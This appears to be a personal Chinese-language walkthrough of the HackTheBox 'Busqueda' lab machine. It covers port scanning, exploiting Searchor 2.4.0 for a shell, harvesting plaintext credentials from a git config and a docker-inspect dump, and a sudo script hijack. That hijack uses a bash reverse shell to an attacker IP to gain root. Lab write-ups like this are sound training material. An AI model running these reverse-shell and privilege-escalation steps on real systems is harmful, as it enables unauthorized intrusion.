---
UID: 20250706221331
aliases: 
tags:
  - 靶场
  - 打靶
  - hackthebox
source: 
cssclasses: 
created: 2025-07-06
---

![image.png](https://s2.loli.net/2025/07/06/zruMbdet2ZaU8gS.png)

![image.png](https://s2.loli.net/2025/07/07/yCtNrueFaqf15lH.png)
[[Busqueda 思]]
## 扫描端口
![image.png](https://s2.loli.net/2025/07/06/Mtv6G1fBUDFwuLo.png)

有一个 80 端口和 22 端口
## 80 端口服务
![image.png](https://s2.loli.net/2025/07/06/BlVvdpnjcL9QbsU.png)

![image.png](https://s2.loli.net/2025/07/06/8VCB1Z3PfHQSIs9.png)

这个步骤可能是个关键点

随便写一个 xss 进去看看
![image.png](https://s2.loli.net/2025/07/06/B5pXikmzL2OdRsE.png)


![image.png](https://s2.loli.net/2025/07/06/TqgI47jLxNkKWCE.png)

只有这样的显示

在底下发现有个 Searchor 2.4.0 ，可能是利用 cms
![image.png](https://s2.loli.net/2025/07/06/Cp4xthW6YBE5oFa.png)

![image.png](https://s2.loli.net/2025/07/06/14EUjV6FbcQeLWI.png)


![image.png](https://s2.loli.net/2025/07/07/fFnGhyKYHWNjs8w.png)

获得反弹 shell
![image.png](https://s2.loli.net/2025/07/07/FUDYjS5Ze9VA3qw.png)

![](https://s2.loli.net/2025/07/07/QFSj5cUbuev8Gri.png)
找到 user. txt
## 提权
用一手 linpeas 进行信息收集

发现蛮多隐藏文件的，其中 git 的文件引人注目
![image.png](https://s2.loli.net/2025/07/07/tHSqUbdaeoxcNk2.png)

![image.png](https://s2.loli.net/2025/07/07/AQsn9fMjT3rJdc4.png)

在查看进程中也时不时就找到/var/www/app这个目录，可能里面有东西

![image.png](https://s2.loli.net/2025/07/07/jaKfFXiwWHT1GQb.png)

刚好在/var/www/app中有个值得关注的东西，佐证了我们的想法

先一个一个看 gitconfig 告诉我们有个邮箱和名字
![image.png](https://s2.loli.net/2025/07/07/R8xCZAwTlaq4uB7.png)

在. git 的文件夹中
![image.png](https://s2.loli.net/2025/07/07/RriB1pwnLG4VyYm.png)

这里面的 index 有 root 权限

配置文件告诉我们有个 gitea 的子域名
![image.png](https://s2.loli.net/2025/07/07/WRQ9TmeDJG5XM2i.png)

配置文件中的这一串就是账密
```
cody:jh1usoih2bkjaspwe92
```

![image.png](https://s2.loli.net/2025/07/07/ujyUwQPnN1BvqoC.png)

登录成功，但我是看不出里面有啥好东西，至少找到了 svc 用户的密码

![image.png](https://s2.loli.net/2025/07/07/GjfcEB27e5lvTb6.png)

查看到 sudo -l 的东西

![image.png](https://s2.loli.net/2025/07/07/8lPKiJFYhs7xDcm.png)

docker ps 查看容器
![image.png](https://s2.loli.net/2025/07/07/BtLO97hquVDXT3S.png)

docker-inspect
```
sudo python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}' gitea |jq .
```

![image.png](https://s2.loli.net/2025/07/07/Vq5rkRoxHUbml7s.png)

找到个账户密码，试试能不能登录 administer

成功登录
![image.png](https://s2.loli.net/2025/07/07/NvVDEzo4AQTJy26.png)

检查一下 system-checkup. py 脚本

![image.png](https://s2.loli.net/2025/07/07/tiYxf3vjhPF4sOm.png)

在这里有个用 full-checkup. sh ，可以利用这个地方，钻个空子

### 修改脚本 反弹 shell
看了 wp，说是新建full-checkup. sh，在里面添加了反弹 shell，就能反弹到 root 权限的反弹 shell
```
svc@busqueda:/tmp$ cat full-checkup.sh
cat full-checkup.sh
#!/bin/bash
bash -i >& /dev/tcp/10.10.16.5/9999 0>&1

svc@busqueda:/tmp$ chmod +x full-checkup.sh
chmod +x full-checkup.sh

svc@busqueda:/tmp$ sudo python3 /opt/scripts/system-checkup.py full-checkup
sudo python3 /opt/scripts/system-checkup.py full-checkup

```

![image.png](https://s2.loli.net/2025/07/07/k3g4tbSFUOZeXKE.png)

获得 root反弹 shell

![image.png](https://s2.loli.net/2025/07/07/dqotP9BRlrcEIT8.png)
